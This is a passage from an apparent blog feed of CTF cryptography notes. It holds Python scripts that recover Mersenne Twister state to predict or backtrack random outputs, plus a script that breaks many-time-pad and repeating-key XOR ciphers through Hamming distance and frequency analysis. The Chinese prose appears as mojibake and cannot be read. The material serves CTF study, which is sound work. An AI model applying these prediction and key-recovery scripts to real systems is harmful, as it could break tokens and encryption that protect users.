class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">rand_buffer = <span class="string">''</span></span><br><span class="line">states = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_data</span><span class="params">()</span> -&gt; List[int]:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'random'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = [int(line.rstrip(<span class="string">'\n'</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line">    <span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    data = [random.getrandbits(32) for i in range(624)]</span></span><br><span class="line"><span class="string">    return data</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftLeftXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = (<span class="number">0xffffffff</span> &gt;&gt; (<span class="number">32</span> - shift)) &lt;&lt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &lt;&lt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unBitshiftRightXor</span><span class="params">(value, shift, mask)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i * shift &lt; <span class="number">32</span>:</span><br><span class="line">        partMask = ((<span class="number">0xffffffff</span> &lt;&lt; (<span class="number">32</span> - shift)) &amp; <span class="number">0xffffffff</span>) &gt;&gt; (shift * i)</span><br><span class="line">        part = value &amp; partMask</span><br><span class="line">        value ^= (part &gt;&gt; shift) &amp; mask</span><br><span class="line">        res |= part</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_states</span><span class="params">(data: List[int])</span> -&gt; List[int]:</span></span><br><span class="line">    states = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">        value = data[i]</span><br><span class="line">        value = unBitshiftRightXor(value, <span class="number">18</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        value = unBitshiftLeftXor(value, <span class="number">15</span>, <span class="number">0xefc60000</span>)</span><br><span class="line">        value = unBitshiftLeftXor(value, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line">        value = unBitshiftRightXor(value, <span class="number">11</span>, <span class="number">0xffffffff</span>)</span><br><span class="line">        states.append(value)</span><br><span class="line">    <span class="keyword">return</span> states</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict_randbits</span><span class="params">(bit_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(bit_length % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    <span class="keyword">global</span> rand_buffer</span><br><span class="line">    <span class="keyword">if</span> len(rand_buffer) &gt;= (bit_length // <span class="number">4</span>):</span><br><span class="line">        res = rand_buffer[:bit_length // <span class="number">4</span>]</span><br><span class="line">        rand_buffer = rand_buffer[bit_length // <span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            y = (states[i] &amp; <span class="number">0x80000000</span>) + (states[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            res = y &gt;&gt; <span class="number">1</span></span><br><span class="line">            res ^= states[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">            <span class="keyword">if</span> y &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">                res ^= <span class="number">0x9908b0df</span></span><br><span class="line">            states[i] = res</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">            value = states[i]</span><br><span class="line">            value ^= (value &gt;&gt; <span class="number">11</span>)</span><br><span class="line">            value ^= (value &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">            value ^= (value &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">            value ^= (value &gt;&gt; <span class="number">18</span>)</span><br><span class="line">            rand_buffer += hex(value)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">        res = rand_buffer[:bit_length // <span class="number">4</span>]</span><br><span class="line">        rand_buffer = rand_buffer[bit_length // <span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace_randbits</span><span class="params">(bit_length)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(bit_length % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">623</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        tmp = states[i]</span><br><span class="line">        tmp ^= states[(i + <span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) == <span class="number">0x80000000</span>:</span><br><span class="line">            tmp ^= <span class="number">0x9908b0df</span></span><br><span class="line">        res = (tmp &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x80000000</span>    <span class="comment">#the first bit of the res</span></span><br><span class="line">        <span class="comment"># the remaining 31 bits of the res</span></span><br><span class="line">        tmp = states[(i - <span class="number">1</span> + <span class="number">624</span>) % <span class="number">624</span>]</span><br><span class="line">        tmp ^= states[(i + <span class="number">396</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> (tmp &amp; <span class="number">0x80000000</span>) == <span class="number">0x80000000</span>:</span><br><span class="line">            tmp ^= <span class="number">0x9908b0df</span></span><br><span class="line">            res |= <span class="number">1</span></span><br><span class="line">        res |= (tmp &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0x7fffffff</span></span><br><span class="line">        states[i] = res</span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> state <span class="keyword">in</span> states[-(bit_length // <span class="number">32</span> + <span class="number">1</span>):]:</span><br><span class="line">        state ^= (state &gt;&gt; <span class="number">11</span>)</span><br><span class="line">        state ^= (state &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">        state ^= (state &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">        state ^= (state &gt;&gt; <span class="number">18</span>)</span><br><span class="line">        value += hex(state)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">return</span> value[-bit_length // <span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> states</span><br><span class="line">    data = read_data()</span><br><span class="line">    <span class="comment"># predict</span></span><br><span class="line">    states = crack_states(data[<span class="number">-624</span>:])</span><br><span class="line">    print(int(predict_randbits(<span class="number">32</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="comment"># backtrace</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    states = crack_states(data[:624])</span></span><br><span class="line"><span class="string">    print(backtrace_randbits(32 * 4))</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="More-2"><a href="#More-2" class="headerlink" title="More"></a>More</h4><p>æˆ–è€…python2ä¸‹ç›´æ¥è°ƒç”¨randcrack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'random'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = [int(line.rstrip(<span class="string">'\n'</span>)) <span class="keyword">for</span> line <span class="keyword">in</span> f]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure><h3 id="è§†æ—¶é—´è¡¥å……"><a href="#è§†æ—¶é—´è¡¥å……" class="headerlink" title="è§†æ—¶é—´è¡¥å……"></a>è§†æ—¶é—´è¡¥å……</h3>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PRNG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(stream)</title>
      <link href="/2020/03/12/Summary-of-Crypto-in-CTF-stream/"/>
      <url>/2020/03/12/Summary-of-Crypto-in-CTF-stream/</url>
      
        <content type="html"><![CDATA[<h3 id="Stream-Cipher-Many-Time-Pad"><a href="#Stream-Cipher-Many-Time-Pad" class="headerlink" title="Stream Cipher - Many Time Pad"></a>Stream Cipher - Many Time Pad</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><ul><li><p>æµå¯†é’¥å¾ªç¯ä½¿ç”¨</p></li><li><p>çŒœæµ‹å¯†é’¥é•¿åº¦</p><p>Hamming Distanceï¼ˆäºŒè¿›åˆ¶ä¸‹ä¸¤ä¸ªç­‰é•¿å­—ç¬¦ä¸²çš„æ¯”ç‰¹ä½å·®å¼‚ï¼‰</p><p>å¤§å°å†™è‹±æ–‡å­—ç¬¦ä¸¤ä¸¤çš„å¹³å‡Hammingè·ç¦»ä¸º2 ~ 3ï¼Œè€Œä»»æ„å­—ç¬¦ä¸¤ä¸¤çš„å¹³å‡Hammingè·ç¦»ä¸º4</p><script type="math/tex; mode=display">\therefore Assumed\quad c1=p1\oplus key,c2=p2\oplus key\\\\\because c1\oplus c2=p1\oplus p2\quad \therefore HammingDis(c1,c2)=HammingDis(p1,p2)</script><p>å–åˆé€‚çš„å¯†é’¥é•¿åº¦ä¸Šä¸‹ç•Œï¼Œè¿›è¡Œåˆ†ç»„è®¡ç®—æ±‰æ˜è·ç¦»</p><p>å°†äºŒå…ƒç»„(key_length, distance)æŒ‰distanceå‡åºæ’åˆ—ï¼Œå–å‰äº”ç»„éªŒè¯å³å¯</p></li><li><p>é€å­—èŠ‚ç ´è§£å¯†é’¥</p><p>åœ¨çŒœæµ‹çš„å¯†é’¥é•¿åº¦åŸºç¡€ä¸Šï¼Œåˆ†å‰²Cipherï¼ˆç”¨åŒä¸€å¯†é’¥å­—èŠ‚åŠ å¯†çš„å¯†æ–‡å½’å…¥åŒç»„ï¼‰</p><p><strong>å­—é¢‘åˆ†æ</strong></p><p>éå†range(0xff)ï¼Œå’Œæ ‡å‡†é¢‘ç‡è¡¨ï¼ˆå«ç©ºæ ¼å’Œå­—æ¯ï¼‰å†…ç§¯æœ€å¤§çš„å³çŒœæµ‹ä¸ºæ­£ç¡®å¯†é’¥å­—èŠ‚</p><p>å› ä¸ºä¸æ­£ç¡®å¯†é’¥å­—èŠ‚ä¸‹ä¹Ÿå¯èƒ½å†…ç§¯å¾ˆå¤§ï¼Œæ‰€ä»¥è¿›è¡Œå¦‚ä¸‹filterï¼š</p><ul><li><p>decode(â€˜asciiâ€™)å‡ºé”™ =&gt; return 0</p></li><li><p>cipheråˆ†ç»„é‡Œä¸ºç©ºæ ¼æˆ–å­—æ¯çš„å­—ç¬¦æ€»æ•° &lt; len(cipher_fragment) // 1.5 =&gt; return 0</p></li></ul><p><strong>çˆ†ç ´ç©ºæ ¼</strong></p><p>åŸºäºç©ºæ ¼å’Œå°å†™å­—æ¯å¼‚æˆ–ç»“æœä¸ºå¯¹åº”å¤§å†™å­—æ¯ï¼Œå’Œå¤§å†™å­—æ¯å¼‚æˆ–ç»“æœä¸ºå¯¹åº”å°å†™å­—æ¯è¿™ä¸€ç‰¹æ€§</p><p>å¯¹åŒä¸€åˆ†ç»„çš„cipherè¿›è¡Œä¸¤ä¸¤å¼‚æˆ–ï¼ˆç›¸å½“äºplainä¸¤ä¸¤å¼‚æˆ–ï¼‰ï¼Œè®°å½•æ¯ä¸ªå­—ç¬¦ä¸å…¶ä»–æ‰€æœ‰å­—ç¬¦å¼‚æˆ–ç»“æœè½åœ¨è½åœ¨å¤§å°å†™å­—æ¯å’Œ0x00ä¸Šçš„æ¬¡æ•°ï¼Œå³å¯è®¤ä¸ºæœ€å¤§æ¬¡æ•°å¯¹åº”çš„å­—ç¬¦ä½ç½®ä¸Šçš„æ˜æ–‡ä¸ºç©ºæ ¼</p></li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">std_rate = &#123;<span class="string">' '</span>: <span class="number">0.18399868388580254</span>, <span class="string">'a'</span>: <span class="number">0.06528332604415538</span>, <span class="string">'b'</span>: <span class="number">0.012531342868095015</span>, <span class="string">'c'</span>: <span class="number">0.021018439349774747</span>, <span class="string">'d'</span>: <span class="number">0.03523431934577844</span>, <span class="string">'e'</span>: <span class="number">0.10261742470196494</span>, <span class="string">'f'</span>: <span class="number">0.019179805952664334</span>, <span class="string">'g'</span>: <span class="number">0.016178672025026573</span>, <span class="string">'h'</span>: <span class="number">0.050890812568726566</span>, <span class="string">'i'</span>: <span class="number">0.056467348737766584</span>, <span class="string">'j'</span>: <span class="number">0.0011847320400802188</span>, <span class="string">'k'</span>: <span class="number">0.006037640287976256</span>, <span class="string">'l'</span>: <span class="number">0.03310705983030898</span>,</span><br><span class="line">            <span class="string">'m'</span>: <span class="number">0.02089774777877722</span>, <span class="string">'n'</span>: <span class="number">0.056334978507447564</span>, <span class="string">'o'</span>: <span class="number">0.06194486601507346</span>, <span class="string">'p'</span>: <span class="number">0.014653281404481763</span>, <span class="string">'q'</span>: <span class="number">0.0009593791262805568</span>, <span class="string">'r'</span>: <span class="number">0.048625794552908115</span>, <span class="string">'s'</span>: <span class="number">0.051741663225580235</span>, <span class="string">'t'</span>: <span class="number">0.07413556318261176</span>, <span class="string">'u'</span>: <span class="number">0.023188985607049396</span>, <span class="string">'v'</span>: <span class="number">0.008010827191217628</span>, <span class="string">'w'</span>: <span class="number">0.018155155658972653</span>, <span class="string">'x'</span>: <span class="number">0.0014651754741116037</span>, <span class="string">'y'</span>: <span class="number">0.015511271998835988</span>, <span class="string">'z'</span>: <span class="number">0.0006457026385315064</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bytes_xor</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(y) &gt; len(x):</span><br><span class="line">        x, y = y, x</span><br><span class="line">    <span class="keyword">return</span> bytes([i ^ j <span class="keyword">for</span> i, j <span class="keyword">in</span> zip(x[:len(y)], y)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    dis = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bytes_xor(x, y):</span><br><span class="line">        dis += bin(byte).count(<span class="string">'1'</span>)</span><br><span class="line">    <span class="keyword">return</span> dis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key_length</span><span class="params">(cipher)</span>:</span></span><br><span class="line">    average_distances = []</span><br><span class="line">    <span class="keyword">for</span> key_length <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">        cipher_fragments = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> key_length * (i + <span class="number">1</span>) &gt; len(cipher):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            cipher_fragments.append(</span><br><span class="line">                cipher[key_length * i: key_length * (i + <span class="number">1</span>)])</span><br><span class="line">        distance = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_fragments) - <span class="number">1</span>):</span><br><span class="line">            distance += hamming_distance(</span><br><span class="line">                cipher_fragments[i], cipher_fragments[i + <span class="number">1</span>])</span><br><span class="line">        distance /= (key_length * len(cipher_fragments))</span><br><span class="line">        average_distances.append((key_length, distance))</span><br><span class="line">    average_distances.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> average_distances</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"># å­—é¢‘åˆ†æ</span></span><br><span class="line"><span class="string">def dot_multiply(p):</span></span><br><span class="line"><span class="string">    rate = [0] * 27</span></span><br><span class="line"><span class="string">    tmp_len = 0</span></span><br><span class="line"><span class="string">    for _ in p:</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            _ = bytes([_]).decode('ascii')</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            return 0</span></span><br><span class="line"><span class="string">        _ = _.lower()</span></span><br><span class="line"><span class="string">        if _ in std_rate:</span></span><br><span class="line"><span class="string">            tmp_len += 1</span></span><br><span class="line"><span class="string">            if _ == ' ':</span></span><br><span class="line"><span class="string">                rate[0] += 1</span></span><br><span class="line"><span class="string">            else:</span></span><br><span class="line"><span class="string">                rate[ord(_) - ord('a') + 1] += 1</span></span><br><span class="line"><span class="string">    if not tmp_len or tmp_len &lt; len(p) // 1.5:</span></span><br><span class="line"><span class="string">        return 0</span></span><br><span class="line"><span class="string">    rate = [i / tmp_len for i in rate]</span></span><br><span class="line"><span class="string">    res = rate[0] * std_rate[' ']</span></span><br><span class="line"><span class="string">    for i in range(1, 27):</span></span><br><span class="line"><span class="string">        res += rate[i] * std_rate[chr(ord('a') + i - 1)]</span></span><br><span class="line"><span class="string">    return res</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def crack_key_fragment(cipher_fragment):</span></span><br><span class="line"><span class="string">    max_dotmul_res = 0</span></span><br><span class="line"><span class="string">    pro_key_fragment = 0</span></span><br><span class="line"><span class="string">    for key_fragment in range(0xff):</span></span><br><span class="line"><span class="string">        key_set = [key_fragment] * len(cipher_fragment)</span></span><br><span class="line"><span class="string">        plain_fragment = bytes_xor(key_set, cipher_fragment)</span></span><br><span class="line"><span class="string">        dotmul_res = dot_multiply(plain_fragment)</span></span><br><span class="line"><span class="string">        if dotmul_res &gt; max_dotmul_res:</span></span><br><span class="line"><span class="string">            max_dotmul_res = dotmul_res</span></span><br><span class="line"><span class="string">            pro_key_fragment = key_fragment</span></span><br><span class="line"><span class="string">    return pro_key_fragment</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def crack_key(cipher, average_distances):</span></span><br><span class="line"><span class="string">    for key_length, _ in average_distances[:5]:</span></span><br><span class="line"><span class="string">        key = []</span></span><br><span class="line"><span class="string">        cipher_fragments = [[] for _ in range(key_length)]</span></span><br><span class="line"><span class="string">        for i, byte in enumerate(cipher):</span></span><br><span class="line"><span class="string">            cipher_fragments[i % key_length].append(byte)</span></span><br><span class="line"><span class="string">        for cipher_fragment in cipher_fragments:</span></span><br><span class="line"><span class="string">            key.append(crack_key_fragment(cipher_fragment))</span></span><br><span class="line"><span class="string">        print(bytes(key))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># çˆ†ç ´ç©ºæ ¼</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key_fragment</span><span class="params">(cipher_fragment)</span>:</span></span><br><span class="line">    max_possible = <span class="number">0</span></span><br><span class="line">    pro_space = <span class="number">0</span>  <span class="comment"># ç©ºæ ¼ä¸‹æ ‡ç´¢å¼•</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher_fragment)):</span><br><span class="line">        possible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(cipher_fragment)):</span><br><span class="line">            <span class="keyword">if</span> i == j:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            _ = cipher_fragment[i] ^ cipher_fragment[j]</span><br><span class="line">            <span class="keyword">if</span> _ <span class="keyword">in</span> letters <span class="keyword">or</span> _ == <span class="number">0</span>:</span><br><span class="line">                possible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> possible &gt; max_possible:</span><br><span class="line">            max_possible = possible</span><br><span class="line">            pro_space = i</span><br><span class="line">    <span class="keyword">return</span> cipher_fragment[pro_space] ^ <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(cipher, average_distances)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> key_length, _ <span class="keyword">in</span> average_distances[:<span class="number">5</span>]:</span><br><span class="line">        key = []</span><br><span class="line">        cipher_fragments = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(key_length)]</span><br><span class="line">        <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(cipher):</span><br><span class="line">            cipher_fragments[i % key_length].append(byte)</span><br><span class="line">        <span class="keyword">for</span> cipher_fragment <span class="keyword">in</span> cipher_fragments:</span><br><span class="line">            key.append(crack_key_fragment(cipher_fragment))</span><br><span class="line">        print(bytes(key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    masked_cipher = <span class="string">b'input your masked_cipher here'</span></span><br><span class="line">    salt = <span class="string">b'input your salt here'</span></span><br><span class="line">    cipher = bytes_xor(masked_cipher, salt *</span><br><span class="line">                       (len(masked_cipher) // len(salt) + <span class="number">1</span>))</span><br><span class="line">    average_distances = get_key_length(cipher)</span><br><span class="line">    crack_key(cipher, average_distances)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="LFSR-Basis"><a href="#LFSR-Basis" class="headerlink" title="LFSR - Basis"></a>LFSR - Basis</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><p>å•ä¸ªlfsrä¸”å·²çŸ¥æŠ½å¤´åºåˆ—çš„æƒ…å†µä¸‹ï¼Œåªè¦æœ‰ä»»æ„nä¸ªæ¯”ç‰¹çš„æµä¿¡æ¯ï¼Œå³å¯è½»æ˜“æ¢å¤å®Œæ•´æµ</p><p>ç­‰ä»·äºè§£nå…ƒ1æ¬¡æ–¹ç¨‹ï¼ˆ18å¹´å›½èµ›streamgameï¼‰</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 